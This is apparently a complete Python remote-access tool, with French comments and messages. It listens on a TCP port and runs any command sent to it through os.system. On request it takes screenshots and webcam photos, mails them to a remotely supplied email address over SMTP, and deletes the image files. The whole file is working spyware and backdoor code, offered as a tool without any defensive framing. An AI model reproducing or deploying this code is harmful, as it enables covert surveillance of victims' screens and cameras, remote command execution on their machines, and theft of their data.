import socket
import os, sys

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from PIL import ImageGrab

import cv2

mail = ""
mailpw = ""
smtpadr = "smtp.gmail.com"
smtpport = 587

def rcvscr():
	try:
		print(mail, mailpw, smtpadr, smtpport) 
		msg = MIMEMultipart()
		msg['From'] = mail
		msg['To'] = mail
		msg['Subject'] = "SCR RCV"
		body = "SCR RCV"
		msg.attach(MIMEText(body, 'plain'))
		filename = "scr.png"
		attachment = open("scr.png", "rb")
		part = MIMEBase('application', 'octet-stream')
		part.set_payload((attachment).read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
		msg.attach(part)	 
		server = smtplib.SMTP(smtpadr, smtpport)
		server.starttls()
		server.login(mail, mailpw)
		text = msg.as_string()
		server.sendmail(mail, mail, text)
		server.quit()
		print("rcv scr... done !")
	except:
		print("rcv scr... error !")

def rcvcam():
	try:
		print(mail, mailpw, smtpadr, smtpport) 
		msg = MIMEMultipart()
		msg['From'] = mail
		msg['To'] = mail
		msg['Subject'] = "CAM RCV"
		body = "CAM RCV"
		msg.attach(MIMEText(body, 'plain'))
		filename = "cam.png"
		attachment = open("cam.png", "rb")
		part = MIMEBase('application', 'octet-stream')
		part.set_payload((attachment).read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
		msg.attach(part)	 
		server = smtplib.SMTP(smtpadr, smtpport)
		server.starttls()
		server.login(mail, mailpw)
		text = msg.as_string()
		server.sendmail(mail, mail, text)
		server.quit()
		print("rcv cam... done !")
	except:
		print("rcv cam... error !")

def scr():
	try:
		scr = ImageGrab.grab(bbox=(0,0,1920,1080))
		scr.save("scr.png")
		print("taking scr.png... done !")
	except:
		print("scr... error !")

def cleanall():
	try:
		cleanscr()
		cleancam()
		print("cleaning... done !")
	except:
		print("clean... error !")
		
def cleanscr():
	try:
		os.remove("scr.png")
		print("cleaning scr files... done !")
	except:
		print("pas de screenshot à nettoyer, ou fichier pas accessible.")

def cleancam():
	try:
		os.remove("cam.png")
		print("cleaning cam files... done !")
	except:
		print("pas de camshot à nettoyer, ou fichier pas accessible.")

def camshot():
	try:
		cam = cv2.VideoCapture(0)
		retval, frame = cam.read()
		cv2.imwrite('cam.png', frame)
		cv2.imshow("cam", frame)
		cv2.waitKey()
		cv2.destroyAllWindows()
		print("camshot... done !")
	except:
		print("camshot... error !")

hote = ''
port = 1666

connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_principale.bind((hote, port))
connexion_principale.listen(5)

print("Le serveur écoute à présent sur le port {}".format(port))

connexion_avec_client, infos_connexion = connexion_principale.accept()
msg_recu = b""
i = 0 
while i < 1:
	msg_recu = connexion_avec_client.recv(1024)
# L'instruction ci-dessous peut lever une exception si le message
# Réceptionné comporte des accents
	print(msg_recu.decode())
	connexion_avec_client.send(b"ok")
	if msg_recu == b"quit":
		print("Fermeture de la connexion")
		i = i + 1
	elif msg_recu[0:3] == b"cmd":
		print(msg_recu.decode()[4:len(msg_recu)])
		os.system(msg_recu.decode()[4:len(msg_recu)])
	elif msg_recu[0:5] == b"mail ":
		mail = msg_recu.decode()[5:len(msg_recu)]
		os.system("cls")
	elif msg_recu[0:7] == b"mailpw ":
		mailpw = msg_recu.decode()[7:len(msg_recu)]
		print(mailpw)
		os.system("cls")
	elif msg_recu[0:8] == b"smtpadr ":
		smtpadr = msg_recu.decode()[8:len(msg_recu)]
		os.system("cls")
	elif msg_recu[0:9] == b"smtpport ":
		try:
			smtpport = int(msg_recu.decode()[9:len(msg_recu)])
		except:
			pass
		os.system("cls")
	elif msg_recu == b"rcv":
		rcvscr()
		rcvcam()
	elif msg_recu == b"clean":
		cleanall()
	elif msg_recu == b"scr":
		scr()
	elif msg_recu == b"camshot":
		camshot()




print("Fermeture de la connexion")

connexion_avec_client.close()
connexion_principale.close()